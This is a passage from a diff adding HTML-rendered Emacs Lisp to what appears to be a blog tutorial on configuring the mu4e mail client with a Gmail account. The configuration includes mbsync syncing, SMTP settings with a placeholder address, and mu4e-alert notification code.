+&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;with-eval-after-load&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;mu4e&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-context-policy&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;ask-if-none&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;mu4e-compose-context-policy&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;pick-first&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-change-filenames-when-moving&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;;; refresh mail using isync every 10 minutes&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-update-interval&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;;; Comment out mu4e-mu-binary if u have mu installed in /usr/bin/ or something&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-mu-binary&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~/Downloads/mu-1.6.6/mu/mu&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-get-mail-command&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mbsync -a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-root-maildir&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~/Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;bind-key&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;C-c C-m&quot;&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;mu4e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-html2text-command&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;w3m -dump -T text/html -o display_link_number=true&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;;; (setq mu4e-html2text-command &quot;html2markdown | grep -v &apos;&amp;amp;nbsp_place_holder;&apos;&quot;)&lt;/span&gt;
+
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;set-email-account!&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Personal&quot;&lt;/span&gt;
+                      &lt;span class=&quot;o&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-sent-folder&lt;/span&gt;          &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Sent Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-drafts-folder&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Drafts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-refile-folder&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/All Mail&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-trash-folder&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Trash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;user-mail-address&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;USERMAIL@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;user-full-name&lt;/span&gt;            &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Dr Drunkenstein&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-compose-signature&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Signed By Mando&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;smtpmail-smtp-user&lt;/span&gt;        &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;USERMAIL@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;smtpmail-smtp-server&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;smtp.gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;smtpmail-stream-type&lt;/span&gt;      &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ssl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;smtpmail-smtp-service&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;465&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                      &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-maildir-shortcuts&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/inbox&quot;&lt;/span&gt;             &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Sent Mail&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Trash&quot;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/Drafts&quot;&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/Gmail/[Gmail]/All Mail&quot;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;?a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;extra-configurations&quot;&gt;Extra Configurations&lt;/h3&gt;
+&lt;p&gt;if you want mail notifications and modeline alert of how many mails u have unread , you’ll need an extra package called &lt;strong&gt;mu4e-alert&lt;/strong&gt;.
+You can install it through &lt;a href=&quot;https://melpa.org/#/mu4e-alert&quot;&gt;Melpa&lt;/a&gt;  using &lt;strong&gt;package-install&lt;/strong&gt; or through &lt;strong&gt;use-package&lt;/strong&gt;
+My Configurations for it is .&lt;/p&gt;
+&lt;div class=&quot;language-lisp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;use-package!&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;:after&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e&lt;/span&gt;
+  &lt;span class=&quot;ss&quot;&gt;:config&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;doom-modeline-mu4e&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-mode-line-display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-notifications&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-set-default-style&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;&apos;libnotify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;map!&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:leader&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:prefix&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mu4e&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+         &lt;span class=&quot;ss&quot;&gt;:desc&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Disable Mu4e Modeline Alert&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;d&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-disable-mode-line-display&lt;/span&gt;
+         &lt;span class=&quot;ss&quot;&gt;:desc&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Enable Mu4e Modeline Alert&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;i&quot;&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;#&apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert-enable-mode-line-display&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;defvar&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;paplay&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/usr/share/sounds/freedesktop/stereo/message.oga&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;Cons list with command to play a sound, and the sound file to play.
+                 Disabled when set to nil.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;setq&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-email-notification-types&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;subjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;defun&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-grouped-mail-notification-formatter-with-bell&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_all-mails&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;&quot;Default function to format MAIL-GROUP for notification.
+                 ALL-MAILS are the all the unread emails&quot;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;when&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;start-process&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cdr&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;+mu4e-alert-bell-cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;let*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mail-count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;length&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;first-mail&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;title-prefix&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You have %d unread emails&quot;&lt;/span&gt;
+                                     &lt;span class=&quot;nv&quot;&gt;mail-count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;field-value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mu4e-alert--get-group&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;first-mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;title-suffix&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;pcase&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mu4e-alert-group-by&lt;/span&gt;
+                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:from&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;from %s:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:to&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;to %s:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:maildir&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;in %s:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:priority&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;with %s priority:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                       &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:flags&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;with %s flags:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                                     &lt;span class=&quot;nv&quot;&gt;field-value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+               &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;title&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s %s&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;title-prefix&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;title-suffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+          &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:title&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;title&lt;/span&gt;
+                &lt;span class=&quot;ss&quot;&gt;:body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;s-join&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\n&quot;&lt;/span&gt;
+                              &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mapcar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                        &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s&amp;lt;b&amp;gt;%s&amp;lt;/b&amp;gt; • %s&quot;&lt;/span&gt;
+                                                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cond&lt;/span&gt;
+                                                 &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:in-reply-to&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;⮩ &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                                 &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;string-match-p&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\\`Fwd:&quot;&lt;/span&gt;
+                                                                  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; ⮯ &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                                 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;  &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                                                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;truncate-string-to-width&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;caar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                                                                          &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+                                                &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;truncate-string-to-width&lt;/span&gt;
+                                                 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;replace-regexp-in-string&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\\`Re: \\|\\`Fwd: &quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+                                                                           &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+                                                 &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;nil&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+                                      &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
+      &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;let*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;new-mail&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;car&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;mail-group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+             &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;subject&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;new-mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:subject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+             &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;caar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;plist-get&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;new-mail&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt;
